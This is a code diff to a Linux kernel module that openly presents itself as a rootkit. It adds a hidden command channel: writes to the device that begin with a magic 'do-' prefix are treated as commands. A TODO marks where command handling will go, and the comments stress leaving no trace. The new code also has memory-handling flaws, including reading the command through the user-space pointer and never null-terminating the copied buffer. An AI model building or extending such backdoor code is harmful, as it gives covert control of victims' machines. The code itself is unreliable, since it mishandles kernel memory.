@@ -7,9 +7,10 @@
 #include <linux/init.h>			/* used for macros */
 #include <linux/fs.h>			/* used for filesystem stuff */
 #include <linux/uaccess.h>		/* required to include <asm/uaccess.h> */
-#include <asm/uaccess.h>	/* for handling data to userland buffers */
+#include <asm/uaccess.h>		/* for handling data to userland buffers */
 #include <linux/device.h>		/* for class/device creation */
-#include "dev_fops.h"
+#include <linux/slab.h>			/* for kernel memory allocation */
+#include <linux/string.h>		/* for string functions */
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("me");
@@ -28,6 +29,7 @@ static ssize_t trivial_read(struct file *, char *, size_t, loff_t *);
 /* useful defines */
 #define DEVICE_NAME "not_a_rootkit"		// name appears in /proc/devices
 #define CLASS_NAME 	"not_a"
+#define SUCCESS		0
 
 /* globals (within this file) */
 static int majorNum;					// device major number assigned
@@ -36,7 +38,7 @@ static struct class *devClass = NULL;
 static struct device *devStruct = NULL;
 
 /* used to store any data aquired, given back during a read()- needs to be allocated */
-static char *deviceBuf = NULL;			
+static char *devBuf = NULL;			
 
 /* must declare file system operations that device can perform- see linux/fs.h */
 static struct file_operations fops = {
@@ -106,7 +108,30 @@ static int trivial_close(struct inode *inode, struct file *f) {
  * expects the amount of bytes written returned
  */
 static ssize_t trivial_write(struct file *f, const char *buff, size_t len, loff_t *off) {
-	printk(KERN_INFO "Write performed to inconspicuous device\n");
+	//printk(KERN_INFO "Write performed to inconspicuous device\n");
+
+	char *privBuf;				// our own buffer in kernel space
+	char magic[] = "do-";		// magic prefix for all commands
+	char *cmdPtr;				// track where in command statement we are later
+
+	privBuf = (char *) kmalloc(len+1, GFP_KERNEL);	// allocate normal kernel RAM
+	if (privBuf == NULL) {
+		printk(KERN_ALERT "ROOTKIT: failed to allocate kernel buffer");
+		return len;
+	}
+
+	/* we are working with a user buffer, must copy into kernel space */
+	copy_from_user(privBuf, buff, len);
+
+	/* if the string starts with the magic prefix, we try to execute the command */
+	if (memcmp(privBuf, magic, 3) == SUCCESS) {
+		cmdPtr = &buff[3];			// cmdPtr should now be the given command
+
+		/* TODO: place our if/elseif strcmp tower here for future commands */
+		printk(KERN_INFO "ROOTKIT: You issued the command: %s\n", cmdPtr);
+
+	}
+	kfree(privBuf);		// leave no trace
 	return len;
 }
 
